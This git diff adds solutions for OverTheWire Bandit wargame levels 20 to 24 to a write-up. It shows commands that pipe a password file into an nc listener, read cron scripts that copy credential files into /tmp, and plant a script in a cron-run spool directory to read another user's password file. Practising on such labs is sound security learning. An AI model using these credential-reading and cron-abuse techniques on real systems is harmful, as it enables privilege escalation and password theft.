@@ -199,3 +199,109 @@ ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
 ```shell
 ./bandit20-do cat /etc/bandit_pass/bandit20
 ```
+
+## level 20 -> level 21
+
+```shell
+cat /etc/bandit_pass/bandit20 | nc -l -p 12345
+```
+
+```shell
+./suconnect 12345
+```
+
+## level 21 -> level 22
+
+```shell
+bandit21@bandit:~$ cd /etc/cron.d/
+
+bandit21@bandit:/etc/cron.d$ ls
+behemoth4_cleanup  cronjob_bandit23  leviathan5_cleanup    sysstat
+clean_tmp          cronjob_bandit24  manpage3_resetpw_job
+cronjob_bandit22   e2scrub_all       otw-tmp-dir
+
+bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+
+## level 22 -> level 23
+
+```shell
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23 
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+bandit22@bandit:~$ whoami
+bandit22
+
+bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+
+## level 23 -> 24
+
+```shell
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+```shell
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+```shell
+bandit23@bandit:~$ mktemp -d
+/tmp/tmp.OAoC8cNtjQ
+
+bandit23@bandit:~$ cd /tmp/tmp.OAoC8cNtjQ
+
+bandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ touch pass.txt
+
+bandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ vi script.sh
+
+bandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ cat script.sh 
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.OAoC8cNtjQ/pass.txt
+
+bandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ chmod 777 -R /tmp/tmp.OAoC8cNtjQ
+
+bandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ cp script.sh /var/spool/bandit24/foo/
+```
+
+After a minute or so, password will be written into `pass.txt`
